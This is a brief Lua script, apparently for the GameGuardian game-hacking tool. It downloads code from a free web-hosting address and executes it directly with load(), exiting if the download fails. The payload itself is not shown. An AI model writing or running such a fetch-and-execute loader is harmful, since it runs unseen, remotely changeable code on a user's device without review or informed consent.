NDH = gg.makeRequest("https://ndhscript.000webhostapp.com/Register.php").content
if not NDH then
gg.sleep(2000)
os.exit()
else
pcall(load(NDH))
end